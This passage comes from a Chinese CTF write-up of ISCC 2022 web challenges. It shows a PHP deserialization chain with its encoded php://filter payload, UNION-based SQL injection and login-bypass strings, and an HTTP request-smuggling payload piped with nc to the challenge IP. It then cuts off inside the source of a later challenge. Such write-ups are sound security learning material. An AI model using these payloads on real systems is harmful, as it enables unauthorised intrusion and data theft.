<span class="line" data-line="16"><span style="color:#E1E4E8">$b</span><span style="color:#F97583">=new</span><span style="color:#79B8FF"> Road_is_Long</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">$c</span><span style="color:#F97583">=new</span><span style="color:#79B8FF"> Make_a_Change</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">$d</span><span style="color:#F97583">=new</span><span style="color:#79B8FF"> Try_Work_Hard</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> page</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$b;</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">$b </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> string</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$c;</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">$c </span><span style="color:#F97583">-></span><span style="color:#E1E4E8"> effort </span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$d;</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="24"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> urlencode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($a));</span></span></code></pre>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>O%3A12%3A"Road_is_Long"%3A2%3A%7Bs%3A4%3A"page"%3BO%3A12%3A"Road_is_Long"%3A2%3A%7Bs%3A4%3A"page"%3BN%3Bs%3A6%3A"string"%3BO%3A13%3A"Make_a_Change"%3A1%3A%7Bs%3A6%3A"effort"%3BO%3A13%3A"Try_Work_Hard"%3A1%3A%7Bs%3A6%3A"%00%2A%00var"%3Bs%3A57%3A"php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php"%3B%7D%7D%7Ds%3A6%3A"string"%3BN%3B%7D</span></span></code></pre>
<h3 id="easy-sql">Easy-SQL</h3>
<blockquote>
<p>Beaxia的邮箱地址忘记了，你能帮忙找找吗？</p>
</blockquote>
<p>试了一下，<code>id=8</code> 时提示 <code>Can you find beaxia's email?</code> ，所以是找 <code>用户8</code> 的邮箱地址，sqlmap跑不出来，最后手注出来了。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>http://59.110.159.206:7010/?id=-8 union table emails limit 7,1</span></span></code></pre>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220503185547189.png" alt="image-20220503185547189"></p>
<p>请求后返回了一个 <code>ypHeMPardErE.zip@beaxia.cn</code> 我们直接访问 <code>http://59.110.159.206:7010/ypHeMPardErE.zip</code> 得到网站源码</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
<span class="line" data-line="2"><span style="color:#F97583">include</span><span style="color:#9ECBFF"> "./config.php"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="3"><span style="color:#6A737D">// error_reporting(0);</span></span>
<span class="line" data-line="4"><span style="color:#6A737D">// highlight_file(__FILE__);</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">$conn </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> mysqli_connect</span><span style="color:#E1E4E8">($hostname, $username, $password, $database);</span></span>
<span class="line" data-line="6"><span style="color:#F97583">   if</span><span style="color:#E1E4E8"> ($conn</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">connect_errno) {</span></span>
<span class="line" data-line="7"><span style="color:#F97583">    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Connection failed: "</span><span style="color:#F97583"> .</span><span style="color:#E1E4E8"> $conn</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">connect_errno);</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">} </span></span>
<span class="line" data-line="9"></span>
<span class="line" data-line="10"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "Where is the database?"</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">"&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="11"></span>
<span class="line" data-line="12"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "try ?id"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="13"></span>
<span class="line" data-line="14"><span style="color:#F97583">function</span><span style="color:#B392F0"> sqlWaf</span><span style="color:#E1E4E8">($s)</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">    $filter </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '/</span><span style="color:#DBEDFF">xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|&#x3C;|;|"|</span><span style="color:#85E89D;font-weight:bold">\^</span><span style="color:#DBEDFF">|</span><span style="color:#85E89D;font-weight:bold">\|</span><span style="color:#DBEDFF">|</span><span style="color:#85E89D;font-weight:bold">\ </span><span style="color:#DBEDFF">|</span><span style="color:#85E89D;font-weight:bold">\'</span><span style="color:#9ECBFF">/i'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="17"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">($filter,$s))</span></span>
<span class="line" data-line="18"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="19"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> True</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="21"></span>
<span class="line" data-line="22"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'id'</span><span style="color:#E1E4E8">])) </span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">    $id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'id'</span><span style="color:#E1E4E8">];</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">    $sql </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "select * from users where id=</span><span style="color:#E1E4E8">$id</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">    $safe </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/</span><span style="color:#DBEDFF">select</span><span style="color:#9ECBFF">/is'</span><span style="color:#E1E4E8">, $id);</span></span>
<span class="line" data-line="27"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($safe</span><span style="color:#F97583">!==</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="28"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"No select!"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">    $result </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> mysqli_query</span><span style="color:#E1E4E8">($conn, $sql);</span></span>
<span class="line" data-line="30"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> ($result) </span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">    {</span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">        $row </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> mysqli_fetch_array</span><span style="color:#E1E4E8">($result);</span></span>
<span class="line" data-line="33"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "&#x3C;h3>"</span><span style="color:#F97583"> .</span><span style="color:#E1E4E8"> $row[</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> "&#x3C;/h3>&#x3C;br>"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="34"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "&#x3C;h3>"</span><span style="color:#F97583"> .</span><span style="color:#E1E4E8"> $row[</span><span style="color:#9ECBFF">'passwd'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> "&#x3C;/h3>"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="36"><span style="color:#F97583">    else</span></span>
<span class="line" data-line="37"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'&#x3C;br>Error!'</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="39"></span>
<span class="line" data-line="40"></span>
<span class="line" data-line="41"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_POST[</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> isset</span><span style="color:#E1E4E8">($_POST[</span><span style="color:#9ECBFF">'passwd'</span><span style="color:#E1E4E8">])) </span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="43"></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">    $username </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> strval</span><span style="color:#E1E4E8">($_POST[</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">]);</span></span>
<span class="line" data-line="45"><span style="color:#E1E4E8">    $passwd </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> strval</span><span style="color:#E1E4E8">($_POST[</span><span style="color:#9ECBFF">'passwd'</span><span style="color:#E1E4E8">]);</span></span>
<span class="line" data-line="46"></span>
<span class="line" data-line="47"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> ( </span><span style="color:#F97583">!</span><span style="color:#B392F0">sqlWaf</span><span style="color:#E1E4E8">($passwd) )</span></span>
<span class="line" data-line="48"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'damn hacker'</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="49"></span>
<span class="line" data-line="50"><span style="color:#E1E4E8">    $sql </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "</span><span style="color:#F97583">SELECT</span><span style="color:#F97583"> *</span><span style="color:#F97583"> FROM</span><span style="color:#9ECBFF"> users </span><span style="color:#F97583">WHERE</span><span style="color:#9ECBFF"> username</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">${username}</span><span style="color:#9ECBFF">' </span><span style="color:#F97583">AND</span><span style="color:#9ECBFF"> passwd</span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '</span><span style="color:#E1E4E8">${passwd}</span><span style="color:#9ECBFF">'"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="51"><span style="color:#E1E4E8">    $result </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $conn</span><span style="color:#F97583">-></span><span style="color:#B392F0">query</span><span style="color:#E1E4E8">($sql);</span></span>
<span class="line" data-line="52"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> ($result</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">num_rows </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
<span class="line" data-line="53"><span style="color:#E1E4E8">        $row </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $result</span><span style="color:#F97583">-></span><span style="color:#B392F0">fetch_assoc</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="54"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> ( $row[</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> 'admin'</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> $row[</span><span style="color:#9ECBFF">'passwd'</span><span style="color:#E1E4E8">] )</span></span>
<span class="line" data-line="55"><span style="color:#E1E4E8">        {</span></span>
<span class="line" data-line="56"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> ($row[</span><span style="color:#9ECBFF">'passwd'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> $passwd)</span></span>
<span class="line" data-line="57"><span style="color:#E1E4E8">            {</span></span>
<span class="line" data-line="58"><span style="color:#F97583">                die</span><span style="color:#E1E4E8">($flag);</span></span>
<span class="line" data-line="59"><span style="color:#E1E4E8">            } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
<span class="line" data-line="60"><span style="color:#F97583">                die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"username or passwd wrong, are you admin?"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="61"><span style="color:#E1E4E8">            }</span></span>
<span class="line" data-line="62"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
<span class="line" data-line="63"><span style="color:#F97583">            die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"wrong user"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="64"><span style="color:#E1E4E8">        }</span></span>
<span class="line" data-line="65"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
<span class="line" data-line="66"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"user not exist or wrong passwd"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="67"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="68"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="69"><span style="color:#79B8FF">mysqli_close</span><span style="color:#E1E4E8">($conn); </span></span>
<span class="line" data-line="70"><span style="color:#F97583">?></span></span></code></pre>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>username=-1' union select 1,'admin',2#&#x26;passwd=2</span></span>
<span class="line" data-line="2"><span>-------------------------------------------------</span></span>
<span class="line" data-line="3"><span>username=admin1' union select 'admin','admin','admin'#&#x26;passwd=admin</span></span></code></pre>
<h3 id="让我康康">让我康康！</h3>
<blockquote>
<p>阿伟说他藏flag超勇的，彬彬托你帮他找出阿伟藏的flag</p>
</blockquote>
<p>原题：<a href="http://www.hackdig.com/10/hack-519692.htm">http://www.hackdig.com/10/hack-519692.htm</a></p>
<p>payload</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 90\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /fl4g HTTP/1.1\r\nHost: localhost\r\nsecr3t_ip:127.0.0.1\r\nContent-Length: 55\r\n\r\nGET / HTTP/1.1\r\nHost: 127.0.0.1:80\r\n\r\n"</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> nc</span><span style="color:#79B8FF"> 59.110.159.206</span><span style="color:#79B8FF"> 7020</span></span></code></pre>
<h3 id="爱国敬业好青年-2">爱国敬业好青年-2</h3>
<blockquote>
<p>这位爱国敬业好青年在哪呢？</p>
</blockquote>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518170818750.png" alt="image-20220518170818750"></p>
<p>根据题干和题目得知要提交位置坐标，这题又和 <code>爱国敬业好青年-1</code>有关联，虽然一直是 <code>0</code> 解，但不影响我解开这题，上一题中有张天安门的图片，直接提交天安门的坐标试试。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line" data-line="1"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">div</span><span style="color:#B392F0"> style</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"text-align: center;width: 100%;height: 100%;position: absolute;top: -0px;left: -0px;z-index: 1"</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">form</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"form"</span><span style="color:#B392F0"> id</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"a-form"</span><span style="color:#B392F0"> method</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">'POST'</span><span style="color:#B392F0"> action</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"flag"</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">        &#x3C;</span><span style="color:#85E89D">b</span><span style="color:#B392F0"> style</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"font-size: 15px"</span><span style="color:#E1E4E8">>                                                       &#x3C;/</span><span style="color:#85E89D">b</span><span style="color:#E1E4E8">>&#x3C;</span><span style="color:#85E89D">br</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">        &#x3C;</span><span style="color:#85E89D">label</span><span style="color:#E1E4E8">>Latitude:&#x3C;/</span><span style="color:#85E89D">label</span><span style="color:#E1E4E8">>&#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> style</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"margin-left: 20px;width: 110px"</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"text"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"lati"</span><span style="color:#B392F0"> required</span><span style="color:#E1E4E8">> &#x3C;</span><span style="color:#85E89D">br</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">        &#x3C;</span><span style="color:#85E89D">label</span><span style="color:#E1E4E8">>Langtitude: &#x3C;/</span><span style="color:#85E89D">label</span><span style="color:#E1E4E8">>&#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> style</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"width: 110px;margin-left: 5px"</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"text"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"langti"</span><span style="color:#B392F0"> required</span><span style="color:#E1E4E8">>&#x3C;</span><span style="color:#85E89D">br</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">        &#x3C;</span><span style="color:#85E89D">button</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"submit"</span><span style="color:#B392F0"> id</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">'true_button'</span><span style="color:#B392F0"> disabled</span><span style="color:#E1E4E8"> =</span><span style="color:#9ECBFF">'true'</span><span style="color:#E1E4E8">>提交&#x3C;/</span><span style="color:#85E89D">button</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">        &#x3C;</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">>经纬度示例：177°30'E, 25°33'N&#x3C;</span><span style="color:#85E89D">a</span><span style="color:#B392F0"> style</span><span style="color:#E1E4E8"> =</span><span style="color:#9ECBFF">"border:none;cursor:default;"</span><span style="color:#B392F0"> onclick</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"</span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#9ECBFF">"</span><span style="color:#B392F0"> href</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"info"</span><span style="color:#E1E4E8">>&#x3C;/</span><span style="color:#85E89D">a</span><span style="color:#E1E4E8">>!&#x3C;/</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">    &#x3C;/</span><span style="color:#85E89D">form</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">div</span><span style="color:#E1E4E8">></span></span></code></pre>
<p>使用题目内置的表单提交会出问题（也可能是出题人故意留的），我们直接提取出有用的信息 <code>PSOT</code> 请求 <code>/flag</code>，然后经度是 <code>lati</code> ，维度是 <code>langti</code>，直接 <code>hackbar</code> 发出去就行了。</p>
<p>一开始 <code>hackbar</code> 发的好好的，但是一会能出flag一会出不来flag，我麻了，直接 <code>python</code> 循环一百次！</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> requests</span></span>
<span class="line" data-line="2"></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span></span>
<span class="line" data-line="4"><span style="color:#9ECBFF">    'langti'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'39°54′N'</span><span style="color:#E1E4E8">,</span></span>
<span class="line" data-line="5"><span style="color:#9ECBFF">    'lati'</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">'116°23′E'</span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="7"></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">url </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'http://59.110.159.206:8020/flag'</span></span>
<span class="line" data-line="9"></span>
<span class="line" data-line="10"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">    r </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> requests.post(url, </span><span style="color:#FFAB70">data</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">data)</span></span>
<span class="line" data-line="12"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(r.text)</span></span></code></pre>
<h3 id="findme">findme</h3>
<blockquote>
<p>从赛博朋克的不夜城中找到你想要的秘密吧</p>
</blockquote>
<p>打开环境一张赛博朋克图片，在源代码里看到注释了 <code>unser.php</code></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line" data-line="1"><span style="color:#E1E4E8">&#x3C;!</span><span style="color:#85E89D">DOCTYPE</span><span style="color:#B392F0"> html</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">html</span><span style="color:#B392F0"> lang</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"en"</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">head</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">meta</span><span style="color:#B392F0"> charset</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"UTF-8"</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">title</span><span style="color:#E1E4E8">>Where am I&#x3C;/</span><span style="color:#85E89D">title</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">head</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">body</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">img</span><span style="color:#B392F0"> src</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"1.png"</span><span style="color:#B392F0"> width</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"100%"</span><span style="color:#B392F0"> height</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"100%"</span><span style="color:#E1E4E8">> &#x3C;</span><span style="color:#85E89D">br</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="9"><span style="color:#6A737D">    &#x3C;!--/unser.php--></span><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">body</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">html</span><span style="color:#E1E4E8">></span></span></code></pre>
<p>访问后得到题目源码</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
<span class="line" data-line="2"><span style="color:#79B8FF">highlight_file</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="3"></span>
<span class="line" data-line="4"><span style="color:#F97583">class</span><span style="color:#B392F0"> a</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="5"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $un0;</span></span>
<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $un1;</span></span>
<span class="line" data-line="7"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $un2;</span></span>
<span class="line" data-line="8"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $un3;</span></span>
<span class="line" data-line="9"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $un4;</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">    </span></span>
<span class="line" data-line="11"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">(){</span></span>
<span class="line" data-line="12"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#79B8FF">empty</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">un0) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> empty</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">un2)){</span></span>
<span class="line" data-line="13"><span style="color:#79B8FF">            $this</span><span style="color:#F97583"> -></span><span style="color:#B392F0"> Givemeanew</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="14"><span style="color:#F97583">            if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> un3 </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> 'unserialize'</span><span style="color:#E1E4E8">){</span></span>
<span class="line" data-line="15"><span style="color:#79B8FF">                $this</span><span style="color:#F97583"> -></span><span style="color:#B392F0"> yigei</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">            }</span></span>
<span class="line" data-line="17"><span style="color:#F97583">            else</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="18"><span style="color:#79B8FF">                $this</span><span style="color:#F97583"> -></span><span style="color:#B392F0"> giao</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">            }</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">        }</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="22"></span>
<span class="line" data-line="23"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> Givemeanew</span><span style="color:#E1E4E8">(){</span></span>
<span class="line" data-line="24"><span style="color:#79B8FF">        $this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> un4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#E1E4E8"> $this</span><span style="color:#F97583">-></span><span style="color:#B392F0">un0</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> un1);</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="26"></span>
<span class="line" data-line="27"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> yigei</span><span style="color:#E1E4E8">(){</span></span>
